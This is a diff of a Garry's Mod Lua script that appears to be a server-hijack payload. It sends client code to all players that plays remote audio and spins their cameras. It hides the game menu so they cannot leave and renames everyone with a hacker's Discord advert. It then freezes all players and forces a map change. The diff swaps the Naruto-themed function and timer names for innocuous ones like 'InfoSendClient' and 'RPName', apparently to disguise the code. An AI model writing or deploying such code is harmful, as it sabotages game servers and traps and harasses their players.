@@ -21,7 +21,7 @@ hook.Add("PlayerInitialSpawn", "JeSuisNaruto"..net_string,function(ply)
     end
 end)
 
-local function NarutoBestClient(code)
+local function InfoSendClient(code)
 local data = util.Compress(code)
 local len = #data
     net.Start(net_string)
@@ -41,22 +41,19 @@ end
 m_strImageGlobalVar = RandomString( 6, 12 )
 
 timer.Simple ( 2.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local AudioSource = nil
 local AMP = 3000
-
 sound.PlayURL("https://lesheitan.fr/songs/Kakashi.mp3", "mono", function(source , err , errname)
     if IsValid(source) then
         AudioSource = source
         source:Play()
     end
 end)
-
 local smoothdata = {}
 for i = 1 , 256 do
     smoothdata[i] = 0
 end
-
 hook.Add("HUDPaint" , "VisualizerIsHere" , function()
 local data = {}
     AudioSource:FFT(data , FFT_25000)
@@ -69,14 +66,14 @@ end)
 end)
 
 timer.Simple( 162.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "VisualizerIsHere" , function()
 end)
 ]=])
 end)
 
 timer.Simple( 2.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Naruto = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "Kakashi", {
     font = "TargetID",
@@ -102,14 +99,14 @@ end)
 end)
 
 timer.Simple( 8.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Hinata", function()
 end)
 ]=])
 end)
 
 timer.Simple( 8.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Kakashi = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "Hinata", {
     font = "TargetID",
@@ -135,14 +132,14 @@ end)
 end)
 
 timer.Simple( 14.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Kakashi", function()
 end)
 ]=])
 end)
 
 timer.Simple( 14.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Best = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "LeSheitan", {
     font = "TargetID",
@@ -168,14 +165,14 @@ end)
 end)
 
 timer.Simple( 20.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Best", function()
 end)
 ]=])
 end)
 
 timer.Simple( 20.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Lee = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -201,14 +198,14 @@ end)
 end)
 
 timer.Simple( 26.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Lee", function()
 end)
 ]=])
 end)
 
 timer.Simple( 26.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Gaara = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -234,14 +231,14 @@ end)
 end)
 
 timer.Simple( 37.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Gaara", function()
 end)
 ]=])
 end)
 
 timer.Simple( 37.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local NarutoNinja = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -267,14 +264,14 @@ end)
 end)
 
 timer.Simple( 50.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "NarutoNinja", function()
 end)
 ]=])
 end)
 
 timer.Simple( 50.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Ino = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -300,14 +297,14 @@ end)
 end)
 
 timer.Simple( 62.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Ino", function()
 end)
 ]=])
 end)
 
 timer.Simple( 62.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Mizukage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -333,14 +330,14 @@ end)
 end)
 
 timer.Simple( 86.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Mizukage", function()
 end)
 ]=])
 end)
 
 timer.Simple( 86.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Hokage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -366,14 +363,14 @@ end)
 end)
 
 timer.Simple( 98.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Hokage", function()
 end)
 ]=])
 end)
 
 timer.Simple( 98.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Kazekage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -399,14 +396,14 @@ end)
 end)
 
 timer.Simple( 102.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Kazekage", function()
 end)
 ]=])
 end)
 
 timer.Simple( 102.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Raikage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -432,14 +429,14 @@ end)
 end)
 
 timer.Simple( 108.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Raikage", function()
 end)
 ]=])
 end)
 
 timer.Simple( 108.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Tsushikage = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -465,14 +462,14 @@ end)
 end)
 
 timer.Simple( 121.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Tsushikage", function()
 end)
 ]=])
 end)
 
 timer.Simple( 121.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Samouraï = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -498,14 +495,14 @@ end)
 end)
 
 timer.Simple( 153.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Samouraï", function()
 end)
 ]=])
 end)
 
 timer.Simple( 153.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Fin = math.Clamp(ScrH()/2.31, 0.85, 1.005);
 surface.CreateFont( "NarutoDev", {
     font = "TargetID",
@@ -531,14 +528,14 @@ end)
 end)
 
 timer.Simple( 162.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "HUDPaint", "Fin", function()
 end)
 ]=])
 end)
 
 timer.Simple( 2.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local tab = {
     [ "$pp_colour_addr" ] = 0,
     [ "$pp_colour_addg" ] = 0,
@@ -557,14 +554,14 @@ end)
 end)
 
 timer.Simple( 26.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "RenderScreenspaceEffects", "NarutoIsHere", function()
 end)
 ]=])
 end)
 
 timer.Simple( 26.5,function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 255, 100, 7)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -574,7 +571,7 @@ end
 end)
 
 timer.Simple( 37.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 0, 125, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -584,7 +581,7 @@ end
 end)
 
 timer.Simple( 50.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 255, 255, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -594,7 +591,7 @@ end
 end)
 
 timer.Simple( 62.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 255, 100, 7)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -604,7 +601,7 @@ end
 end)
 
 timer.Simple( 86.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 0, 125, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -614,7 +611,7 @@ end
 end)
 
 timer.Simple( 98.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 255, 255, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -624,7 +621,7 @@ end
 end)
 
 timer.Simple( 102.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 255, 100, 7)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -634,7 +631,7 @@ end
 end)
 
 timer.Simple( 108.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 0, 125, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -644,7 +641,7 @@ end
 end)
 
 timer.Simple( 121.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 255, 255, 255)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -654,7 +651,7 @@ end
 end)
 
 timer.Simple( 153.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 function GAMEMODE:PostDraw2DSkyBox()
 local col = Color( 255, 100, 7)
     render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
@@ -664,7 +661,7 @@ end
 end)
 
 timer.Simple( 26.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local tab = {
     [ "$pp_colour_addr" ] = 0.1,
     [ "$pp_colour_addg" ] = 0,
@@ -683,7 +680,7 @@ end)
 end)
 
 timer.Simple( 26.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 g_]=].. m_strImageGlobalVar.. [=[ = {}
     local html = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
     local function LoadWebMaterial(strURL, strUID, intSizeX, intSizeY)
@@ -710,7 +707,7 @@ end
 end)
 
 timer.Simple( 26.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local Stars = ParticleEmitter( LocalPlayer():GetPos())
 local function GetWebMat( strURL )
     return g_]=].. m_strImageGlobalVar.. [=[[strURL]
@@ -740,20 +737,19 @@ end)
 end)
 
 timer.Simple( 162.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "Think", "KakashiIsHere")
 ]=])
 end)
 
 timer.Simple( 26.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 50, 15, 120)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -762,20 +758,19 @@ hook.Add( "CalcView", "MyCalcView1", MyCalcView )
 end)
 
 timer.Simple( 26.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView1")
 ]=])
 end)
 
 timer.Simple( 37.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 10, 0, 95)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -784,21 +779,20 @@ hook.Add( "CalcView", "MyCalcView2", MyCalcView )
 end)
 
 timer.Simple( 50.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView2")
 ]=])
 end)
 
 
 timer.Simple( 50.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 90, 50, 50)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -807,20 +801,19 @@ hook.Add( "CalcView", "MyCalcView3", MyCalcView )
 end)
 
 timer.Simple( 62.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView3")
 ]=])
 end)
 
 timer.Simple( 62.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 90, 50, 80)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -829,20 +822,19 @@ hook.Add( "CalcView", "MyCalcView4", MyCalcView )
 end)
 
 timer.Simple( 86.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView4")
 ]=])
 end)
 
 timer.Simple( 86.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 100, 0, 65)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -851,20 +843,19 @@ hook.Add( "CalcView", "MyCalcView5", MyCalcView )
 end)
 
 timer.Simple( 98.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView5")
 ]=])
 end)
 
 timer.Simple( 98.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 60, 10, 56)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -873,20 +864,19 @@ hook.Add( "CalcView", "MyCalcView6", MyCalcView )
 end)
 
 timer.Simple( 102.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView6")
 ]=])
 end)
 
 timer.Simple( 102.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 110, 0, 75)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -895,20 +885,19 @@ hook.Add( "CalcView", "MyCalcView7", MyCalcView )
 end)
 
 timer.Simple( 108.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView7")
 ]=])
 end)
 
 timer.Simple( 108.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 75, 0, 45)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -917,20 +906,19 @@ hook.Add( "CalcView", "MyCalcView8", MyCalcView )
 end)
 
 timer.Simple( 121.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView8")
 ]=])
 end)
 
 timer.Simple( 121.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 140, 10, 45)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -939,20 +927,19 @@ hook.Add( "CalcView", "MyCalcView9", MyCalcView )
 end)
 
 timer.Simple( 153.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView9")
 ]=])
 end)
 
 timer.Simple( 153.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 local function MyCalcView(ply, pos, angles, fov)
     local view = {}
     view.origin = pos
     view.angles = Angle( CurTime() % 360 * - 180, 30, 10)
     view.fov = fov
     view.drawviewer = false
-
     return view
 end
      
@@ -961,7 +948,7 @@ hook.Add( "CalcView", "MyCalcView10", MyCalcView )
 end)
 
 timer.Simple( 2.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
 hook.Add("PreDrawHUD", "EchapDisparition", function()
     gui.HideGameUI()
 end)
@@ -969,22 +956,22 @@ end)
 end)
 
 timer.Simple( 162.5, function()
-NarutoBestClient([=[
+InfoSendClient([=[
     hook.Remove( "CalcView", "MyCalcView10")
 ]=])
 end)
 
-timer.Create("OupsGM_Construct", 164.5, 1, function()
+timer.Create("LoadGM", 164.5, 1, function()
     RunConsoleCommand("ulx", "map", "gm_construct")
 end)
 
-timer.Create("NarutoName", 2.5, 99, function()
+timer.Create("RPName", 2.5, 99, function()
     for _, v in pairs(player.GetAll()) do
         v:setDarkRPVar("rpname", "Hack by Hakai SSv -) Join my Discord : discord.gg/kurama")
     end
 end)
 
-timer.Create("NarutoFreeze",  26.5, 99, function()
+timer.Create("Freeze",  26.5, 99, function()
     RunConsoleCommand("ulx", "freeze", "*")
 end)
 
